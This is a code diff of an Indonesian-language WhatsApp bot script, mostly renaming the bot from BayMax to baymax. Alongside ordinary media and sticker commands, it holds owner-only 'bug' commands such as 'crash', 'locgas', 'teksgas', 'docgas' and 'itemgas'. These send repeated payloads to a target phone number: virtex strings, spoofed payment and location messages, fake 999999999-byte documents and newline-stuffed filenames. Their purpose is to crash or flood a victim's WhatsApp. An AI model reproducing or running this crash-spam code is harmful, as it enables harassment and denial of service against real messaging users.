@@ -2188,25 +2188,25 @@ rowId: x.key
 }
 }
 const listMessageNya = {
-text: `Hai Kak ${pushname}\n\nBerikut Adalah List Item\nSilahkan Pilih Salah Satu!!!\n${tanggal(new Date())}\n? Jam : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB`,
-footer: "List By BayMax",
+text: `Hai Kak ${pushname}\n\nBerikut Adalah List Item\nSilahkan Pilih Salah Satu!!!\n${tanggal(new Date())}\n🕰 Jam : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')} WIB`,
+footer: "List By baymax",
 buttonText: "Click Here",
 sections: [{
 title: groupName, rows: arr_rows
 }],
 listType: 1
 }
-const sendMsge = await BayMax.sendMessage(from, listMessageNya)
+const sendMsge = await baymax.sendMessage(from, listMessageNya)
 break
 case 'addlist':
-if (!itsByMax) return reply(mess.owner)
+if (!itsMeKayla) return reply(mess.owner)
 if (!m.isGroup) return reply(mess.group)
 var args1 = text.split("@")[0]
 var args2 = text.split("@")[1]    
 if (!q.includes("@")) return reply(`Gunakan dengan cara ${prefix+command.slice(0)} *Nama Item@Item*\n\n_Contoh_\n\n${prefix+command.slice(0)} namalist@List`)
 if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
 if (/image/.test(mime)) {
-media = await BayMax.downloadAndSaveMediaMessage(quoted)
+media = await baymax.downloadAndSaveMediaMessage(quoted)
 mem = await uptotelegra(media)
 addResponList(from, args1, args2, true, `${mem}`, db_respon_list)
 reply(`Sukses set list message dengan key : *${args1}*`)
@@ -2217,7 +2217,7 @@ reply(`Sukses Add List Dengan Kunci : *${args1}*`)
 }
 break
 case 'dellist':
-if (!itsByMax) return reply(mess.owner)
+if (!itsMeKayla) return reply(mess.owner)
 if (!m.isGroup) return reply(mess.group)
 if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
 if (!q) return reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item*\n\n_Contoh_\n\n${command.slice(1)} namalist`)
@@ -2226,14 +2226,14 @@ delResponList(from, q, db_respon_list)
 reply(`Sukses delete list message dengan key *${q}*`)
 break
 case 'updatelist':
-if (!itsByMax) return reply(mess.owner)
+if (!itsMeKayla) return reply(mess.owner)
 if (!m.isGroup) return reply(mess.group)
 var args1 = q.split("@")[0]
 var args2 = q.split("@")[1]
 if (!q.includes("@")) return reply(`Gunakan dengan cara ${command.slice(1)} *Nama Item@Item*\n\n_Contoh_\n\n${command.slice(1)} namalist@List`)
 if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
 if (/image/.test(mime)) {
-media = await BayMax.downloadAndSaveMediaMessage(quoted)
+media = await baymax.downloadAndSaveMediaMessage(quoted)
 mem = await uptotelegra(media)
 updateResponList(from, args1, args2, true, `${mem}`, db_respon_list)
 reply(`Sukses update list message dengan key : *${args1}*`)
@@ -2246,8 +2246,8 @@ break
 case 'snobg': {
 if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
 if (/image/.test(mime)) {
-let media = await BayMax.downloadAndSaveMediaMessage(quoted)
-let encmedia = await BayMax.sendImageAsSticker(m.chat, await rmbg(media), m, { packname: global.packname, author: global.author })
+let media = await baymax.downloadAndSaveMediaMessage(quoted)
+let encmedia = await baymax.sendImageAsSticker(m.chat, await rmbg(media), m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 } else {
 reply(`Kirim/Reply Gambar Dengan Caption ${prefix+command}`)
@@ -2257,9 +2257,9 @@ break
 case 'tourl':
 try {
 if (!isMedia) return reply(`Kirim/Reply Foto/Vi Dengan Caption ${prefix + command}`)
-mee = await BayMax.downloadAndSaveMediaMessage(quoted)
+mee = await baymax.downloadAndSaveMediaMessage(quoted)
 mem = await uptotelegra(mee)
-BayMax.sendMessage(m.chat, {text:mem},{quoted:m})
+baymax.sendMessage(m.chat, {text:mem},{quoted:m})
 } catch (err) {
 reply(`Reply Image Nya Bang`)
 }
@@ -2275,40 +2275,40 @@ case 'gay':
 case 'jail':
 try {
 if (!isMedia) return reply(`Kirim/Reply Foto/Vi Dengan Caption ${prefix + command}`)
-meeh = await BayMax.downloadAndSaveMediaMessage(quoted)
+meeh = await baymax.downloadAndSaveMediaMessage(quoted)
 memh = await uptotelegra(meeh)
 gdye = await getBuffer(`https://some-random-api.ml/canvas/${command}?avatar=${memh}`)
-BayMax.sendImageAsSticker(m.chat, gdye, m, { packname: global.packname, author: global.author })
+baymax.sendImageAsSticker(m.chat, gdye, m, { packname: global.packname, author: global.author })
 } catch (err) {
 reply(`Reply Image Nya Bang`)
 }
 break
 case 'tovn':
 if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Reply Video/Audio That You Want To Be VN With Caption ${prefix + command}`)
-mee = await BayMax.downloadAndSaveMediaMessage(quoted)
+mee = await baymax.downloadAndSaveMediaMessage(quoted)
 mem = await uptotelegra(mee)
-BayMax.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:true, mentions:[m.sender]}, { quoted: m })
+baymax.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:true, mentions:[m.sender]}, { quoted: m })
 break
 case 'toaudio':
 if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply the Video/Audio You Want to Use as Audio With Caption ${prefix + command}`)
-mee = await BayMax.downloadAndSaveMediaMessage(quoted)
+mee = await baymax.downloadAndSaveMediaMessage(quoted)
 mem = await uptotelegra(mee)
-BayMax.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:false, mentions:[m.sender]}, { quoted: m })
+baymax.sendMessage(m.chat, { audio: { url: mem }, mimetype: 'audio/mp4', ptt:false, mentions:[m.sender]}, { quoted: m })
 break
 case 'tomp3':
 if (/document/.test(mime)) return reply(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
 if (!/video/.test(mime) && !/audio/.test(mime)) return reply(`Send/Reply Video/Audio You Want to Convert into MP3 With Caption ${prefix + command}`)
-mee = await BayMax.downloadAndSaveMediaMessage(quoted)
+mee = await baymax.downloadAndSaveMediaMessage(quoted)
 mem = await uptotelegra(mee)
-BayMax.sendMessage(m.chat, { document: {url:mem}, mimetype: 'audio/mpeg', fileName: `Convert By ${pushname}.mp3`, jpegThumbnail: ppnyauser, mentions:[sender] }, {quoted:m})
+baymax.sendMessage(m.chat, { document: {url:mem}, mimetype: 'audio/mpeg', fileName: `Convert By ${pushname}.mp3`, jpegThumbnail: ppnyauser, mentions:[sender] }, {quoted:m})
 break
 case 'smeme':
 if (!q) return reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
 if (!isMedia) return reply(`Kirim/Reply Foto Dengan Caption ${prefix + command} *teks*`)
-mee = await BayMax.downloadAndSaveMediaMessage(quoted)
+mee = await baymax.downloadAndSaveMediaMessage(quoted)
 mem = await uptotelegra(mee)
 kaytid = await getBuffer(`https://api.memegen.link/images/custom/-/${q}.png?background=${mem}`)
-BayMax.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
+baymax.sendImageAsSticker(m.chat, kaytid, m, { packname: global.packname, author: global.author })
 break
 case 'cekme':
 					neme = args.join(" ")
@@ -2317,7 +2317,7 @@ case 'cekme':
 					var hoby = ['Memasak','Membantu Atok','Mabar','Nobar','Sosmedtan','Membantu Orang lain','Nonton Anime','Nonton Drakor','Naik Motor','Nyanyi','Menari','Bertumbuk','Menggambar','Foto fotoan Ga jelas','Maen Game','Berbicara Sendiri']
 					var bukcin = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					var arp = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
-					var cakep = ['Iyaa cakep kek mimin','Maaf Kak, Banyak? Perawatan Ya','Jelek ajg','Cakep banget kek mimin?','?','??']
+					var cakep = ['Iyaa cakep kek mimin','Maaf Kak, Banyak² Perawatan Ya','Jelek ajg','Cakep banget kek mimin😍','❌','✔️']
 					var wetak= ['Penyayang','Pemurah','Pemarah','Pemaaf','Penurut','Baik','Baperan','Baik Hati','penyabar','UwU','top deh, pokoknya','Suka Membantu']
 					var baikk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
 					var bhuruk = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
@@ -2335,7 +2335,7 @@ case 'cekme':
 					var cerdas = cerdhas[Math.floor(Math.random() * cerdhas.length)]
 					var berani = berhani[Math.floor(Math.random() * berhani.length)]
 					var takut = mengheikan[Math.floor(Math.random() * mengheikan.length)]
-					 profile = `*�ԨT�T�T�T�� Cek Sifat @${bet.split('@')[0]} ���T�T�T�T��*
+					 profile = `*≡════《 Cek Sifat @${bet.split('@')[0]} 》════≡*
 
 *Nama :* ${pushname}
 *Sifat :* ${sipat}
@@ -2350,19 +2350,19 @@ case 'cekme':
 *Keberanian :* ${berani}%
 *Ketakutan :* ${takut}%
 
-*�ԨT�T�T�T�T�� CEKSIFATME ���T�T�T�T�T��*`
+*≡═════《 CEKSIFATME 》═════≡*`
 					buff = await getBuffer(ppuser)
-BayMax.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
+baymax.sendMessage(from, { image: buff, caption: profile, mentions: [bet]},{quoted:m})
 break
 case 'toimg': {
 if (!/webp/.test(mime)) return reply(`balas stiker dengan caption *${prefix+command}*`)
-let media = await BayMax.downloadAndSaveMediaMessage(quoted)
+let media = await baymax.downloadAndSaveMediaMessage(quoted)
 let ran = await getRandom('.png')
 exec(`ffmpeg -i ${media} ${ran}`, (err) => {
 fs.unlinkSync(media)
 if (err) throw err
 let buffer = fs.readFileSync(ran)
-BayMax.sendMessage(m.chat, { image: buffer, jpegThumbnail: ppnyauser, 
+baymax.sendMessage(m.chat, { image: buffer, jpegThumbnail: ppnyauser, 
 contextInfo: {
 "mentionedJid": [sender],
 "externalAdReply": {
@@ -2385,12 +2385,12 @@ case 's': {
 if (!quoted) return reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
 if (/image/.test(mime)) {
 let media = await quoted.download()
-let encmedia = await BayMax.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
+let encmedia = await baymax.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 } else if (/video/.test(mime)) {
 if ((quoted.msg || quoted).seconds > 11) return reply('Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik')
 let media = await quoted.download()
-let encmedia = await BayMax.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
+let encmedia = await baymax.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
 await fs.unlinkSync(encmedia)
 } else {
 reply(`Kirim/Reply Gambar/Video/Gifs Dengan Caption ${prefix+command}\nDurasi Video 1-9 Detik`)
@@ -2438,7 +2438,7 @@ case 'piatu':
 if (!m.isGroup) return reply(mess.group)
 let member = participants.map((u) => u.id)
 let org = member[Math.floor(Math.random() * member.length)]
-BayMax.sendMessage(from, { text: `anak ${command} di sini adalah @${org.split('@')[0]}`, mentions: [org] }, { quoted: m })
+baymax.sendMessage(from, { text: `anak ${command} di sini adalah @${org.split('@')[0]}`, mentions: [org] }, { quoted: m })
 }
 break
 case 'goblokcek':
@@ -2504,11 +2504,11 @@ if (!m.isGroup) return reply(mess.group)
 const cex = body.slice(0)
 const cek2 = cek1[Math.floor(Math.random() * cek1.length)]
 if (mentionByReply) {
-BayMax.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nNomer : ' + `@${mentionByReply.split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
+baymax.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nNomer : ' + `@${mentionByReply.split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [mentionByReply] }, { quoted: m })
 } else if (mentionByTag[0] && isGroup) {
-BayMax.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nNomer : ' + `@${mentionByTag[0].split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
+baymax.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nNomer : ' + `@${mentionByTag[0].split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [mentionByTag[0]] }, { quoted: m })
 } else if (!mentionByReply && !mentionByTag[0]) {
-BayMax.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nNomer : ' + `@${sender.split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
+baymax.sendMessage(from, { text: 'Pertanyaan : *' + cex + '*\nNomer : ' + `@${sender.split('@')[0]}` + '\nJawaban : ' + cek2 + '%', mentions: [sender] }, { quoted: m })
 }
 break
 case 'cekbapak':
@@ -2530,10 +2530,10 @@ reply(util.format(res))
 }
 break
 case 'vote': {
-if (!itsByMax) return reply(mess.owner)
+if (!itsMeKayla) return reply(mess.owner)
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "pollCreationMessage": {
-"name": "HALO SAYA BAYMAX ",
+"name": "HALO SAYA baymax BOT",
 "options": [
 	{
 "optionName": "KATANYA WA KEBAL"
@@ -2548,13 +2548,13 @@ var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 "optionName": "KATANYA KEBAL"
 	},
 	{
-"optionName": "SALAM DARI BAYMAX "
+"optionName": "SALAM DARI baymax BOT"
 	}
 ],
 "selectableOptionsCount": 5
 	}
 }), { userJid: m.chat, quoted: crsh })
-BayMax.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
+baymax.relayMessage(m.chat, pollCreation.message, { messageId: pollCreation.key.id })
 reply(mess.succes)
 }
 break
@@ -2563,18 +2563,18 @@ if (!q) return reply(`Penggunaan ${prefix+command} 6285842107854`)
 num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
 jumlah = '30'
 for (let i = 0; i < jumlah; i++) {
-BayMax.sendMessage(num,{text:`hai`},{quoted:lep})
+baymax.sendMessage(num,{text:`hai`},{quoted:lep})
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${q} Sebanyak ${jumlah}`)
 }
 break
 case 'crash':{
-if (!itsByMax) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
+if (!itsMeKayla) return reply(mess.owner)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6287705048235`)
 jumlah = '15'
 for (let i = 0; i < jumlah; i++) {
-BayMax.sendMessage(`${q}`.split("-").join("").split(" ").join("").replace("+", "")+"@s.whatsapp.net", {sticker: ppnyauser},{quoted: {
+baymax.sendMessage(`${q}`.split("-").join("").split(" ").join("").replace("+", "")+"@s.whatsapp.net", {sticker: ppnyauser},{quoted: {
 key: { 
 fromMe: false, 
 participant: `0@s.whatsapp.net`, 
@@ -2602,23 +2602,23 @@ reply(`Sukses Send Bug Ke Nomor ${q} Sebanyak ${jumlah}`)
 }
 break
 case 'jagoan' : {
-if (!itsByMax) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
-BayMax.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { 
+if (!itsMeKayla) return reply(mess.owner)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6287705048235`)
+baymax.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g,'')+"@s.whatsapp.net", { 
 requestPaymentMessage: { 
 Message: { 
 extendedTextMessage: { 
-text: 'Hai Aku BayMax', 
+text: 'Hai Aku baymax', 
 currencyCodeIso4217: 'IDR', 
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
 amount: 1, 
 contextInfo:{
 "externalAdReply": {
-"title": `BayMax  ${virus}${virtex(prefix)}`,
-"body": `BayMax  ${virus}${virtex(prefix)}`,
+"title": `baymax Bot ${virus}${virtex(prefix)}`,
+"body": `baymax Bot ${virus}${virtex(prefix)}`,
 mimetype: 'audio/mpeg', 
-caption: `BayMax  WhatsApp${ngazap(prefix)}`,
+caption: `baymax Bot WhatsApp${ngazap(prefix)}`,
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
 thumbnailUrl: ppnyauser, 
@@ -2629,22 +2629,22 @@ await sleep(1000)
 }
 break
 case 'jagoanneon' : {
-if (!itsByMax) return reply(mess.owner)
-BayMax.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.chat, { 
+if (!itsMeKayla) return reply(mess.owner)
+baymax.relayMessage(m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : m.chat, { 
 requestPaymentMessage: { 
 Message: { 
 extendedTextMessage: { 
-text: `BayMax  ${virus}${virtex(prefix)}`, 
+text: `baymax Bot ${virus}${virtex(prefix)}`, 
 currencyCodeIso4217: 'IDR', 
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
 amount: 1, 
 contextInfo:{
 "externalAdReply": {
-"title": `BayMax `,
+"title": `baymax Bot`,
 "body": `Masih Bawahan`,
 mimetype: 'audio/mpeg', 
-caption: `BayMax  WhatsApp${ngazap(prefix)}`,
+caption: `baymax Bot WhatsApp${ngazap(prefix)}`,
 showAdAttribution: true,
 sourceUrl: `https://youtube.com/c/HwModsWa857`,
 thumbnailUrl: ppnyauser, 
@@ -2655,41 +2655,41 @@ await sleep(1000)
 }
 break
 case 'locgas':{
-if (!itsByMax) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
+if (!itsMeKayla) return reply(mess.owner)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: BayMax.waUploadToServer })
+var messa = await prepareWAMessageMedia({ image: ppnyauser }, { upload: baymax.waUploadToServer })
 var liveLocation = generateWAMessageFromContent(num, proto.Message.fromObject({
 "liveLocationMessage": {
 "degreesLatitude": -6.9367014,
 "degreesLongitude": 107.7228574,
-"name": `BayMax  ${virus}${virtex(prefix)}`,
+"name": `baymax Bot ${virus}${virtex(prefix)}`,
 "url": "https://foursquare.com/v/58245afd7c74e13e299229d9",
-"caption": `BayMax  ${virus}${virtex(prefix)}`,
+"caption": `baymax Bot ${virus}${virtex(prefix)}`,
 "sequenceNumber": "1657237469254001",
 "jpegThumbnail": messa.imageMessage,
 "mtype": "locationMessage"
 }
 }), { userJid: num, quoted: lep })
-BayMax.relayMessage(num, liveLocation.message, { messageId: liveLocation.key.id })
+baymax.relayMessage(num, liveLocation.message, { messageId: liveLocation.key.id })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'teksgas':{
-if (!itsByMax) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
+if (!itsMeKayla) return reply(mess.owner)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-BayMax.relayMessage(num, {
+baymax.relayMessage(num, {
 requestPaymentMessage: { 
 Message: { 
 extendedTextMessage: { 
-text: `BayMax  ${virus}${virtex(prefix)}`, 
+text: `baymax Bot ${virus}${virtex(prefix)}`, 
 currencyCodeIso4217: 'IDR', 
 requestFrom: '0@s.whatsapp.net', 
 expiryTimestamp: 8000, 
@@ -2701,38 +2701,38 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'vngas':{
-if (!itsByMax) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
+if (!itsMeKayla) return reply(mess.owner)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-BayMax.sendMessage(num, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
+baymax.sendMessage(num, { audio: audionye, mimetype: 'audio/mp4', seconds: 999999999, ptt:true, mentions:[m.sender]}, { quoted: vien })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'kongas':{
-if (!itsByMax) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
+if (!itsMeKayla) return reply(mess.owner)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-BayMax.sendContact(num, owner, lep)
+baymax.sendContact(num, owner, lep)
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'docgas':{
-if (!itsByMax) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
+if (!itsMeKayla) return reply(mess.owner)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-BayMax.sendMessage(num, { 
+baymax.sendMessage(num, { 
 document: ppnyauser, 
-fileName: `? BayMax  ??\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.???? ???`, 
+fileName: `🔥 baymax BOT ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonvirus2}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`, 
 mimetype: `application/txt`, 
 jpegThumbnail: ppnyauser, 
 fileLength: "999999999", 
@@ -2743,42 +2743,42 @@ reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'stickgas':{
-if (!itsByMax) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
+if (!itsMeKayla) return reply(mess.owner)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-BayMax.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
+baymax.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
 await sleep(1000)
 }
 reply(`Sukses Send Bug Ke Nomor ${num} Sebanyak ${jumlah}`)
 }
 break
 case 'itemgas': {
-if (!itsByMax) return reply(mess.owner)
-if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281390368580`)
+if (!itsMeKayla) return reply(mess.owner)
+if (!q) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 6281297970769`)
 num = `${q}`+'@s.whatsapp.net'
 jumlah = '25'
 for (let i = 0; i < jumlah; i++) {
-sendBugcrash(num, `BayMax  ${virus}${virtex(prefix)}`, `BayMax  ${virus}${virtex(prefix)}`, `BayMax  ${virus}${virtex(prefix)}`, ppnyauser, "6281390368580@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
+sendBugcrash(num, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, `baymax Bot ${virus}${virtex(prefix)}`, ppnyauser, "6285773822576@s.whatsapp.net", [{ productId: "5040735986035760" }], "5040735986035760")
